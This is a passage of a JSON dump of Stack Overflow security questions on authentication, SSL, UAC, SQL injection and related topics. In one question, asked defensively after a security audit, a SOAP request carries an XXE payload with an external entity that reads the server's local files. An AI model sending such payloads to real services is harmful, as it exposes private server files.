when signing up?</p>\n\n<p>cURL of course sends this over headers, but headers can always (?) be faked.</p>\n\n<p>Is there a better course of action to enforce domain for this sort of thing?</p>\n\n<p>(NB I'm already using an API key, too - it's just I wanted to restrict domain, too)</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["wcf","security","rest","ssl"],"answer_count":2,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":4008,"score":9,"question_id":393580,"title":"WCF Authentication WITHOUT SSL","body":"<p>Is there a way to setup authentication (ala \"Basic Authentication\") without actually setting up an SSL Certificate?  I'd also like to do this in REST or regular SOAP WCF Services, preferably in REST, but would like to be able to mix the services.  In other words, \"I want to be able to send a regular old username and password just like in Basic Authentication but without the SSL.\"  Is there a way to do this?</p>\n"},{"tags":["c#","visual-studio-2008","visual-studio-2010","security","manifest"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":157,"score":0,"question_id":6059615,"title":".Net Console App keeps crashing","body":"<p>I added the Manifest file with the element</p>\n\n<pre><code>&lt;requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" /&gt;\n</code></pre>\n\n<p>I built the project and it keeps crashing when a non-administrator runs it.</p>\n\n<blockquote>\n  <p>Unhandled Exception: System.Security.SecurityException: Request for\n  the permissi on of type\n  'System.Security.Permissions.RegistryPermission, mscorlib, Version=2.\n  0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' failed.    at System.Security.CodeAccessSecurityEngine.Check(Object demand,\n  StackCrawlMa rk&amp; stackMark, Boolean isPermSet)    at\n  System.Security.CodeAccessPermission.Demand()    at\n  Microsoft.Win32.RegistryKey.CheckSubKeyReadPermission(String\n  subkeyName)    at\n  Microsoft.Win32.RegistryKey.CheckOpenSubKeyPermission(String\n  subkeyName, B oolean subKeyWritable)    at\n  Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable) \n  at\n  LotusTrustedSites.RegistryKeyExtensionMethods.GetOrCreateSubKey(RegistryKe\n  y registryKey, String parentKeyLocation, String key, Boolean writable)\n  at LotusTrustedSites.ReportDownloader.Main(String[] args) The action\n  that failed was: Demand The type of the first permission that failed\n  was: System.Security.Permissions.RegistryPermission</p>\n  \n  <p>The assembly or AppDomain that failed was: MyApp, Version=1.0.0.0,\n  Culture=neutral, PublicKeyToken=null The method that caused the\n  failure was: Microsoft.Win32.RegistryKey\n  GetOrCreateSubKey(Microsoft.Win32.RegistryKey, Syste m.String,\n  System.String, Boolean)</p>\n</blockquote>\n"},{"tags":["visual-studio-2010","security","windows-7","uac"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12981102,"title":"How to Setup particular Programs in Windows7 Administrator access to Non-Admin User","body":"<p>I have team of developers in my company, and i have windows7 installed with <code>UAC</code> on all the machines, now the Dotnetnuke Compiled Template require Administrator access to create, because they are linked with IIS, so everytime they want to work on DNN Modules, they calls me to input the Credentials, and if they by-mistake close the VS, they again my Credentials, is there a way to run only Particular Application with Administrator on Standard User Accounts.</p>\n"},{"tags":["java","security"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":73,"score":3,"question_id":12986333,"title":"Appearance of Java Security dialog","body":"<p>Somebody asked me if I'd seen the Java Security dialog appear when loading a signed applet.  What does the Java Security dialog look like?</p>\n"},{"tags":["java","security","applet","code-signing","javasound"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12970190,"title":"Applet sound recorder","body":"<p>I have an applet which is doing some sound recording work. When I run it on eclipse with Applet viewer , the sound recording and its play back is working fine. But when I put that applet in browser, all the buttons and controls are visible but the recording and play back is not working. Any reasons for that?</p>\n\n<p>I have signed the jar but still it is not working.  I verified my jar from jarsigner. It messages </p>\n\n<pre><code>jar is unsigned (Signature missing or unparsable)\n</code></pre>\n\n<p>What does this message means actually?</p>\n\n<h3>Update</h3>\n\n<p>The Jar is now signed and verified (as per comments), new exception is:</p>\n\n<pre><code>   java.lang.SecurityException: trusted loader attempted to load sandboxed resource    from file:/D:/Junaid/workspace/AudioProjectApplet/bin/com/audio/\n   at com.sun.deploy.security.CPCallbackHandler$ParentCallback.check(Unknown Source)\n   at com.sun.deploy.security.CPCallbackHandler$ParentCallback.access$1500(Unknown Source)\n   at com.sun.deploy.security.CPCallbackHandler$ChildElement.checkResource(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.checkResource(Unknown Source)\n   at sun.plugin2.applet.Applet2ClassLoader.findClass(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadClass0(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadClass(Unknown Source)\n   at java.lang.ClassLoader.loadClass(Unknown Source)\n   at sun.plugin2.applet.Plugin2ClassLoader.loadCode(Unknown Source)\n   at sun.plugin2.applet.Plugin2Manager.initAppletAdapter(Unknown Source)\n   at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)\n   at java.lang.Thread.run(Unknown Source)\n</code></pre>\n"},{"tags":["security","wif","claims-based-identity"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12974966,"title":"Appropriate usage of tokens in a claims based security model?","body":"<p>i'm new to claims based security. I understand the premise but have some questions regarding the token.</p>\n\n<p>From what I understand, the token will carry all of the claims for a given user, and that different systems will use different claims to determine authorization to a system. On this point I have several questions;</p>\n\n<p>1) Does this mean that the STS is aware of all claims for all systems? Does this not mean the token could become gargantuan in size? Or does the token only carry the claims as needed by the relying party requesting the authentication?</p>\n\n<p>2) Should claims be leveraged to determine fine grained access to a system, or are relying parties expected to maintain a separate means of tracking permissions?</p>\n\n<p>I have a system with 100's of different user permissions. In trying to move to a claims based solution, the missing piece for me is, are all of the permissions meant to be managed by the STS and provided in the token? Or, do I use the token to authenticate the user, then manage permissions myself? Or perhaps some inbetween?</p>\n\n<p>Help and guidance would be appreciated!</p>\n\n<p>Kind regards\nTheMistry</p>\n"},{"tags":["java","php","security","mongodb","mongo-java"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":368,"score":0,"question_id":6479393,"title":"Mongodb: client side user authentication security issue","body":"<p>I am using Mongodb Java driver for my Java client application. it needs to connect to mongodb server running remotely.</p>\n\n<p>I am concerned that someone could decompile jar and find out the ip address to the mongodb server and access it. but the user needs to have read and write access. Should I create a database for each user and authenticate them? or create a User collection myself?</p>\n\n<pre><code>mongo =  new Mongo(\"mongodb.server\", 27017);\n                db = mongo.getDB(\"mydatabase\");\n                db.authenticate(\"test\", \"password\");\n</code></pre>\n\n<p>btw, the db.authenticate requires char[] as password....so that db.authenticate() is not working.               </p>\n\n<p>Another solution I thought of was to use an middleman server which will connect to mongodb only. The application would connect to the middleman server via HTTP POST.</p>\n\n<p>However, I need to directly store Java objects serialized into JSON on mongodb, so using the middleman server it makes things difficult.</p>\n"},{"tags":["javascript","security","browser-bugs"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12985166,"title":"Executing JavaScript on an iframe's contents from a different domain","body":"<p>Is this denied by the browser? Is it possible?</p>\n\n<p>If so, are that browser bugs that allow it to happen? I noticed this:</p>\n\n<p><a href=\"http://html5sec.org\" rel=\"nofollow\">http://html5sec.org</a></p>\n\n<p>How can you close these bugs and prevent them from working on your website? Can I detect if someone is trying to execute javascript from another domain?</p>\n\n<p>Thanks.</p>\n"},{"tags":["mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":41,"score":3,"question_id":12984304,"title":"Prompt for password when mysql client reconnects","body":"<p>I am invoking mysql through the following : </p>\n\n<pre><code>mysql -h localhost -u user -p db \n</code></pre>\n\n<p>This will lead to the user being prompted to enter the password.</p>\n\n<p>However I have set the interactive_timeout to 60 secs.</p>\n\n<p>After 60 sec, the client will timeout but since the reconnect option is not set to false hence it will try to reconnect.\nWhile reconnect, the mysql client does not prompt for password.\nI want to make it prompt for password while reconnecting.\nCan anyone help me on this.</p>\n\n<p>Here is the sample output</p>\n\n<pre><code>mysql -h localhost -u user -p db \nEnter password: \nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 26\nServer version: 5.1.58 MySQL Community Server (GPL)\n\nCopyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.\nThis software comes with ABSOLUTELY NO WARRANTY. This is free software,\nand you are welcome to modify and redistribute it under the GPL v2 license\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; show variables;\nERROR 2006 (HY000): MySQL server has gone away\nNo connection. Trying to reconnect...\nConnection id:    30\nCurrent database: db\n</code></pre>\n\n<p>I want it to prompt for password while reconnecting</p>\n"},{"tags":["php","security","dirname"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":53,"score":1,"question_id":12983581,"title":"Is the using of dirname(__FILE__) a security risk?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10424963/best-practice-for-php-paths\">Best practice for PHP paths</a>  </p>\n</blockquote>\n\n\n\n<p>looking at the code of Joomla I see that in the first line of the index, it defines the base path of installation with the </p>\n\n<pre><code>dirname(__FILE__)\n</code></pre>\n\n<p>is this a font of possible risk for the site, I mean if a non controlled error message show the internal path of the Joomla directory, because of, for example a failed include, can it be used to perform some kind of attack to the site ? If yes, is it convenient to use this function ? Any idea is welcome.</p>\n\n<p>Thanks</p>\n"},{"tags":["java","spring","security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12983380,"title":"How do I utilize Spring 3's Security with SSO?","body":"<p>We are using Spring 3 framework and we have a SSO (Single sign on) provider which redirects to our app passing special tokens in the request to indicate the user is authenticated. </p>\n\n<p>I would like to use Spring security to handle stuff like denying access to pages unless the user is authenticated, but I'd also like to be able to bypass this on my local machine while developing the application.</p>\n\n<p>So in the production scenario, I expect the SSO to redirect to our app, specifically to a \"/login.html\" target which is supposed to somehow trigger a custom class I write to pull the expected login info from request and load up the user's info from our database and put it in session for the rest of the app to use.</p>\n\n<p>Then in the development scenario I need to bypass SSO by just being able to create a session using a custom login page and then load the user's info from database just as above.</p>\n\n<p>I am trying to figure out how to do it myself but I can't seem to wrap my head around all of it. </p>\n\n<p>Any info on how to accomplish this even just high level kind of road map would be a huge help</p>\n"},{"tags":["security","cakephp","ssl","cakephp-2.0"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12981148,"title":"Redirecting SSL to non-SSL after login authentication","body":"<p>I have a Cakephp 2+ site that needs certain actions to require an SSL connection, (i.e. login, password reset, etc.), but I don't require the entire site to be secure.  While implementing this I found that the Session was not being saved when moving between the SSL and non-SSL pages.  I found this question on stack <a href=\"http://stackoverflow.com/a/12068099/1353839\">http://stackoverflow.com/a/12068099/1353839</a> that solved the issue for me, but I am wondering at what cost.</p>\n\n<p>The answer in the above question required commenting out a line in lib/Cake/Model/Datasource/ as follows:</p>\n\n<pre><code>if (!isset($sessionConfig['ini']['session.cookie_secure']) &amp;&amp; env('HTTPS')){\n   // $sessionConfig['ini']['session.cookie_secure'] = 1; // &lt;-- Commented Out\n}\n</code></pre>\n\n<p>Are there any security ramifications to doing this?  Also, is there a way to do this without affecting the cake core files since that is generally frowned upon?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["security","ssh","public-key-encryption","ssh-keys"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":21,"score":-2,"question_id":12982983,"title":"Should I have multiple ssh key pairs? If so, how to deal with them?","body":"<p>I have never thought much about ssh key pairs, however, I use them on a daily basis: git, ssh password-less auth, encryption, etc.</p>\n\n<p>And I have been:</p>\n\n<ul>\n<li>generating a pair per device;</li>\n<li>adding all public keys to all authorized keys of all other devices;</li>\n<li>same for github etc;</li>\n</ul>\n\n<p>One pair per device seems to make sense as they have the pmatos@ in the end. On the other hand, from the perspective that they should identify you, it doesn't make much sense to have more than one pair and you should probably just copy them from one device to the next when you move to another device and keep the private key in a vault somewhere.</p>\n\n<p>Also, imagine I publish a public key for someone to encrypt something for me? From which keypair should I publish the public key from (or should I generate yet another pair for this purpose)?</p>\n\n<p>What's the correct way to handle this?</p>\n"},{"tags":["java","security","maven","gpl","bouncycastle"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12982595,"title":"openjdk sun.security libs on maven?","body":"<p>I have <a href=\"https://github.com/read-write-web/rww-play\" rel=\"nofollow\" title=\"rww-play\">a project</a> where I need to </p>\n\n<ol>\n<li>create an X509 certificate - this is easy with <a href=\"https://dvcs.w3.org/hg/read-write-web/file/258d2757ef3d/src/main/scala/auth/X509Cert.scala#l45\" rel=\"nofollow\">sun.security.x509 classes</a></li>\n<li>build a <a href=\"http://en.wikipedia.org/wiki/Spkac\" rel=\"nofollow\" title=\"Signed Public Key and Challenge\">Signed Public Key and Challenge</a> parser, which should be relatively easy too using sun.security.*</li>\n</ol>\n\n<p>The problem is that the sun.security.* classes are not available on all java platforms (only on the sun/oracle ones). </p>\n\n<p>I could use <a href=\"http://www.bouncycastle.org/latest_releases.html\" rel=\"nofollow\" title=\"Bouncy Castle\">BouncyCastle</a> ( and I have in the <a href=\"https://github.com/bblfish/foafssl-java/\" rel=\"nofollow\" title=\"keygen\">foafssl/keygen</a> project ) but</p>\n\n<ul>\n<li>their jars are very heavy, requiring a minimum of 2MB. This is annoying knowing that most of the code is already shipping in the jdk - ( so one can reduce the size of the code later it is true...)</li>\n<li>they seem to take a lot of time to get their jars on maven central, their latest <a href=\"http://repo1.maven.org/maven2/org/bouncycastle/bcprov-jdk16/\" rel=\"nofollow\" title=\"bcprov-jdk16-1.46\">bcprov-jdk16-1.46</a> dating from December 2011</li>\n<li>I found their APIs very confusing -- but they may have improved, and my skills at ASN.1 parsing are quite shaky</li>\n</ul>\n\n<p>So the other solution is that <a href=\"http://openjdk.java.net/projects/jdk7/\" rel=\"nofollow\" title=\"openjdk7\">OpenJDK7</a> is licenced under the GPL 2 with classpath exception. ( See <a href=\"http://www.docjar.org/docs/api/sun/security/x509/X509Cert.html\" rel=\"nofollow\" title=\"X509Cert source code\">X509Cert source code</a> for example) I think this means one should be able to compile the libraries, put them on maven and use them from there. Then one could write code that would fetch those remote jars if needed and not just use the ones shipped on the OS. What do people make of this solution?</p>\n"},{"tags":["java","security","encryption","hsm"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12981977,"title":"How do I integrate HSM encryption with JAVA?","body":"<p>How do i integrate Hardware Security Module encryption with a java application? I'm looking for code samples to connect to HSMs, generate keys(asymmetric, symmetric), encrypt and decrypt data (asymmetric, symmetric) and store keys.</p>\n"},{"tags":["security","google-app-engine","urllib2","choice","urlfetch"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12972306,"title":"Using Google AppEngine Urlfetch instead of urllib2","body":"<p>What is the difference between googles urlfetch over the python lib urllib2 ?</p>\n\n<p>When I came upon Google's urlfetch i thought maybe there were security reasons. Perheps google were safer in terms of malicous urls or something?</p>\n\n<p>Is there any reason why I should choose google over urllib2?</p>\n\n<p>Thanks!</p>\n"},{"tags":["java","security","jaxb","jax-ws","ws-security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":95,"score":3,"question_id":12977299,"title":"Preven XXE Attack with JAXB","body":"<p>Recently, we had a security audit on our code, and one of the problem is that our application is subject to the <strong>Xml EXternal Entity</strong> (XXE) attack.</p>\n\n<p>Basically, the application is an calculator that receives inputs as XML, through a Web-Service.</p>\n\n<p>Here is an example of such XXE attack on our application:</p>\n\n<pre><code>&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n   &lt;soapenv:Header/&gt;\n   &lt;soapenv:Body&gt;\n      &lt;foo:calculateStuff&gt;\n         &lt;!--Optional:--&gt;\n         &lt;xmlInput&gt;&lt;![CDATA[&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE currency [  \n   &lt;!ENTITY include SYSTEM \"file:///d:/\" &gt;]&gt;\n&lt;calcinput&gt;...&lt;/calcinput&gt;\n]]&gt;&lt;/xmlInput&gt;\n      &lt;/foo:calculateStuff&gt;\n   &lt;/soapenv:Body&gt;\n&lt;/soapenv:Envelope&gt;\n</code></pre>\n\n<p>As you can see, we can refers to an entity that points to an external file (<code>\"file:///d:/\"</code>).</p>\n\n<p>Regarding the XML input itself (the <code>&lt;calcinput&gt;...&lt;/calcinput&gt;</code> part) is unmarshalled with JAXB (v2.1). The web-service part is based on jaxws-rt (2.1).</p>\n\n<p>What do I need to do to secure my web-service?</p>\n\n<p>Thanks.</p>\n"},{"tags":["facebook","security","api","privacy"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12970598,"title":"Facebook API to access privacy and security settings","body":"<p>Is there a way to get security and privacy settings of a Facebook account? The app that's being designed will need to:</p>\n\n<ul>\n<li>login to a Facebook account,</li>\n<li>retrieve all privacy and security settings, and</li>\n<li>display the settings on a single page in a custom way.</li>\n</ul>\n\n<p>I did a lot of online searching, checked the FB Developer's site, but found nothing relevant so far.</p>\n"},{"tags":["php","javascript","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12977135,"title":"Security: tracking pixels","body":"<p>Our company works with affiliates that promote our products. They get paid based on how many sales they bring to us.</p>\n\n<p>To track conversions, they ask us to put third party tracking pixels on our \"thank you\" page (final page where our customer is being redirected after payment through third party billing processor is complete).</p>\n\n<p>So, we ended up with a ton of tracking JS code and hidden iframes on our \"thank you\" page.</p>\n\n<p><strong>Is it safe?</strong><br>\nThe billing processor sends sensitive data to this page via GET variables that we'd rather not make accessible to the affiliates.</p>\n\n<p>Or maybe there is a better way to do this? Like, store all the tracking code from our affiliates in a database and only load the one that matches the customer's referral?</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I'm worried about \"third party tracking pixels\" that are not from the \"trusted\" third parties (Like Google, Yahoo) but custom-made by our affiliates.</p>\n"},{"tags":["security","authentication","symfony2","firewall"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":121,"score":0,"question_id":11801622,"title":"How to authenticate on 2 different symfony2 firewalls at the same time?","body":"<p>I have a Symfony application with 2 areas, one for clients accessing from a web page an other for API calls from AJAX and web services.</p>\n\n<p>Each one of this areas is protected with a firewall on its own. The WEB interface is authenticated with a log in form and the API with <code>http_basic</code>.</p>\n\n<p>Both firewalls work fine, but when the WEB interface makes an AJAX call to the API interface, then the browser prompts the user to log in again, even when he was already logged in (via log in form). This is what I want to avoid. I Would like that both firewalls were authenticated at the same time to prevent this prompt.</p>\n\n<p>I've seen another question with <strong>exactly</strong> the same problem. But they are using <code>http_basic</code> authentication on both firewalls, so, the solution proposed did't work on my case:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/9075041/authenticate-multiple-symfony2-firewalls-with-one-login-form\">Authenticate multiple symfony2 firewalls with one login form</a></p>\n\n<p>My security.yml</p>\n\n<pre><code>#....\nfirewalls:\n    api:\n        pattern:    ^/API\n        context: primary_auth\n        stateless:  true\n        http_basic: \n            realm: \"API: Please log in\"\n\n    web:\n        pattern:    ^/\n        context: primary_auth\n        form_login:\n            check_path: /login_check\n            login_path: /login\n            provider: fos_userbundle\n        logout:\n            path:   /logout\n            target: /\n        anonymous: ~\n</code></pre>\n"},{"tags":["java","security","certificate","digital-certificate","pkcs#11"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":126,"score":0,"question_id":10461540,"title":"VASCO Digital Certificate","body":"<p>How to read vasco digital certificate. </p>\n\n<p>I am using in config file following</p>\n\n<pre><code>name=\"VASCO DP CertiID PKCS#11 V2.20\"\nlibrary=\"C:\\Program Files\\VASCO\\DIGIPASS CertiID\\VdsPKCS1132.dll\"\n</code></pre>\n\n<p>I am getting this error:</p>\n\n<pre><code>java.security.KeyStoreException: KeyStore instantiation failed\n    at java.security.KeyStore$Builder$2.getKeyStore(Unknown Source)\n    at eTokenApplet.initializeCard(eTokenApplet.java:417)\n    at eTokenApplet.getCertificates(eTokenApplet.java:1952)\n    at sun.reflect.GeneratedMethodAccessor5.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n    at java.lang.reflect.Method.invoke(Unknown Source)\n    at sun.plugin.javascript.JSInvoke.invoke(Unknown Source)\n    at sun.reflect.GeneratedMethodAccessor3.invoke(Unknown Source)\n    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\n    at java.lang.reflect.Method.invoke(Unknown Source)\n    at sun.plugin.javascript.JSClassLoader.invoke(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass$MethodInfo.invoke(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass$MemberBundle.invoke(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass.invoke0(Unknown Source)\n    at sun.plugin2.liveconnect.JavaClass.invoke(Unknown Source)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo$DefaultInvocationDelegate.invoke(Unknown Source)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo$3.run(Unknown Source)\n    at java.security.AccessController.doPrivileged(Native Method)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo.doObjectOp(Unknown Source)\n    at sun.plugin2.main.client.LiveConnectSupport$PerAppletInfo$LiveConnectWorker.run(Unknown Source)\n    at java.lang.Thread.run(Unknown Source)\nCaused by: java.security.KeyStoreException: PKCS11 not found\n    at java.security.KeyStore.getInstance(Unknown Source)\n    at java.security.KeyStore$Builder$2$1.run(Unknown Source)\n    at java.security.AccessController.doPrivileged(Native Method)\n    ... 21 more\nCaused by: java.security.NoSuchAlgorithmException: no such algorithm: PKCS11 for provider SunPKCS11-VASCO DP CertiID PKCS#11 V2.20\n    at sun.security.jca.GetInstance.getService(Unknown Source)\n    at sun.security.jca.GetInstance.getInstance(Unknown Source)\n    at java.security.Security.getImpl(Unknown Source)\n</code></pre>\n"},{"tags":["asp.net","security","reporting-services"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1935,"score":4,"question_id":538894,"title":"SSRS 2005 - Configuring User Authentication/Authorization","body":"<p>I have created an ASP.NET 2.0 web application and would like to use SSRS 2005 for reporting purposes.</p>\n\n<p>The web application uses forms authentication and custom roles for authorization. I have created reports and deployed it to a our SQL Server 2005 box.</p>\n\n<p>I have two options to integrate the reports into my application:</p>\n\n<p>1) Link to SSRS from within my application. The link would have the parameters and options specified. I make sure that the link only shows for authorized users and it links to correct report with appropriate parameters.</p>\n\n<p>2) Use ReportViewer control and display reports using that. All processing will be done by SSRS</p>\n\n<p>However, I am not sure of the best way to configure security in the IIS on the Reporting Services box. Currently it is set to Windows Integrated Authentication. Also the reporting service has my username with Browser role.</p>\n\n<p>Not all users of my application will have AD login. Also the application is on internet and I don't want to open up SSRS more than necessary. At the same time, I want it to be seamless for our users in that I don't want SSRS to prompt for username and password.</p>\n\n<p>What is the best way to accomplish this? Should I create a dummy AD user and then use it to communicate between ASP.NET app and SSRS? Or if not that, what is the easiest way that achieves everything I need?</p>\n"},{"tags":[".net","wpf","security","mvvm","securestring"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12973832,"title":"Protecting sensitive PII data in a WPF Textbox","body":"<p>I'm looking for some guidance on using securestring with a regular WPF textbox.  The application has several different Personally Identifiable Information (PII) fields that are entered, displayed and compared throughout the application.   I've reviewed a number of posts regarding securestring use with the PasswordBox control, but the password box isn't applicable to this situation because the values need to be displayed and updated by the user.</p>\n\n<p>My main point of uncertainty is around using the textbox.text property.  It seems that simply converting the text property to/from a securestring for use in the viewmodel and model would still leave the value of the text property in memory as a string.  If the app needs to display this data is that just the best that can be done?  Or, is there some further means of protecting this data?</p>\n"},{"tags":["asp.net","security",".aspxauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12973277,"title":".ASPXAuth Cookie changes during session","body":"<p>Is there any reason why, in the middle of an authenticated session, the .ASPXAUTH cookie would change its value?</p>\n\n<p>It doesn't seem that ASP.Net_SessionId has changed its value at the same point (and the session hasn't expired).</p>\n\n<p>Are there some rules that dictate that the .ASPXAUTH cookie value is updated periodically or for any other reason?</p>\n\n<p>Issue is that we're cross checking the values of these cookies that they don't change during a session as a protection against xss or session hijacking.</p>\n"},{"tags":["c#","database","security","dll","connection"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12973229,"title":"C# Database Connection Stored in DLL to Call","body":"<p>I am New to the more enhanced features of the C# and .NET coding practices</p>\n\n<p>I have been trying to Find A solution to using a particular method in C# for Winforms, Windows Services And ASP.NET web Applications where you program your connection to SQL and Convert the C# Code file to a dll to be used in your project. </p>\n\n<p>The idea is to Create the Connection and Convert it to a dll so that every time you start a function and need to make a database connection you will just write it where you say</p>\n\n<pre><code>Function ABC\n{\n    //VB Version would be like this as i have seen this\n    Dim DCDLL as New Dataconn \n\n    //Where 'DCDLL' is the DLL file which is being declared as a new dataconnection\n\n    //C# Version would be Alon these Lines\n    SQLConnection DataConn = New SQLConnection(DCDLL)\n}\n</code></pre>\n\n<p>I have only seen the VB Code version of the Call so I am not keen on the C# Method that this would be done</p>\n\n<p>Meanwhile The DLL Holds all the other code like</p>\n\n<pre><code>string ConnectionString = \n                    \"Data Source=Datasource; UID=User; PWD=Pass; Persist Security\n                     Info=True; Initial Catalog= Catalog\";\nDataconn = new SqlConnection(ConnectionString);\nDataconn.Open();\n</code></pre>\n\n<p>the purpose of the DLL would be to handle the connection to the database, Open it catch errors if dataconnection is not successfull and close the connection if needed so that you dont have to programatically do this every time. Also it is only responsible for the connection therefore you can use a function to call the connection execute the procedure and whatever else is required. </p>\n\n<p>The idea of using a DLL is just to make the Connection settings to the Database a little more secure, the Connection obviously wont become super secure but it adds more security than having the Code in you code pages etc.</p>\n\n<p>i have spoken to and seen people use this type of method but my research on how to achieve this via google and other sources does not seem to understand what i am searching for.</p>\n\n<p>I am trying to understand that when i code this file how it must be done as to ensure that it handles the database connection correctly without issues and doesnt break.</p>\n\n<p>If anyone can Give me Examples in C# of how to do this it would be appreciated or if you know of any pages that have explained how to achieve this i would be most grateful for your assistance</p>\n"},{"tags":["php","sql","security","sql-injection","web-security"],"answer_count":4,"favorite_count":6,"up_vote_count":14,"down_vote_count":0,"view_count":7348,"score":14,"question_id":860954,"title":"Examples of SQL Injections through addslashes()?","body":"<p>In PHP, I know that mysql_real_escape in much safer than using addslashes.\nHowever, I could not find an example of a situation where addslashes would let an SQL Injection happen.\nCan anyone give some examples?</p>\n\n<p>Thanks!</p>\n"},{"tags":["ios","security","in-app-purchase"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12970678,"title":"IAP receipt validation \"Fallback\" check","body":"<p>I am implementing a receipt validation with my server in my App. 98% of the time the server response well but sometimes I have a server error that it is not connected to the receipt validation process. </p>\n\n<p>An other problem is when I get a duplicate receipt warning which can sometimes accrue when a user stops the app before the transaction is finished and the app resubmits the same receipt.</p>\n\n<p>What I thought is to make a check fallback to apple severs with the Apple VerificationController. </p>\n\n<p>Somthing like that -</p>\n\n<ol>\n<li>If my server returns a valid or invalid -> supply the content or return an error.</li>\n<li>If I get a server error or a duplicate receipt -> make an other check directly to apple servers.</li>\n<li>If it is invalid return an error, If it is valid supply the content assuming that I will reduce a little bit of my security.</li>\n</ol>\n\n<p>Since I am not a security expert I wish to know if there are any drawbacks to this approach ?</p>\n\n<p>Thanks </p>\n\n<p>Shani</p>\n"},{"tags":["ruby-on-rails","security","activerecord","sql-injection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12970441,"title":"Rails sql injection in custom \"where\" clause","body":"<p>I'm building a custom where clause for a model, and I wanted to know if the way I'm doing it is a secure way against sql injection attacks.\nThis is my method:</p>\n\n<pre><code>def self.search(search)\n  if search\n    conditions = []\n    conditions &lt;&lt; [ 'name like ?', search[:name] ] unless search[:name].blank?\n    conditions &lt;&lt; [ 'product_type_id = ?', search[:product_type_id] ] unless search[:product_type_id].blank?\n\n    conditions = ( conditions.empty? ? nil : [conditions.transpose.first.join(' and '), *conditions.transpose.last] )\n    where(conditions)\n  else\n    scoped\n  end\nend\n</code></pre>\n\n<p>What do yo think?\nThanks in advance!</p>\n"},{"tags":["html","security","http"],"answer_count":23,"favorite_count":63,"up_vote_count":93,"down_vote_count":1,"view_count":28954,"score":92,"question_id":198462,"title":"Is either GET or POST more secure than the other?","body":"<p>When comparing an HTTP GET to an HTTP POST, what are the differences from a security perspective? Is one of the choices inherently more secure than the other? If so, why?</p>\n\n<p>I realize that POST doesn't expose information on the URL, but is there any real value in that or is it just security through obscurity? Is there ever a reason that I should prefer POST when security is a concern?</p>\n\n<p><strong>Edit:</strong><br>\nOver HTTPS, POST data is encoded, but could URLs be sniffed by a 3rd party? 